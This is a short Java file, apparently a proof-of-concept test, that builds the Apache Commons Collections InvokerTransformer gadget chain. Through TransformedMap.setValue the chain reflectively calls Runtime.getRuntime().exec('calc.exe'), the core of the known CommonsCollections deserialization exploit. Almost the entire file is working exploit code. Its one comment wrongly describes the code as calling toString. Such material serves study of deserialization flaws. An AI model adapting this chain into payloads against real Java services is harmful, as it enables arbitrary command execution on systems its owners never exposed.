import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

import java.util.*;

public class TransformedMapTest {

    public static void main(String[] args) {
        new TransformedMapTest().run();
    }

    public void run() {
        Map map = new HashMap();
        map.put("key", "value");
        //调用目标对象的toString方法
        String command = "calc.exe";
        final String[] execArgs = new String[]{command};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs)
        };
        Transformer transformer = new ChainedTransformer(transformers);
        Map<String, Object> transformedMap = TransformedMap.decorate(map, null, transformer);
        for (Map.Entry<String, Object> entry : transformedMap.entrySet()) {
            entry.setValue("anything");
        }
    }
}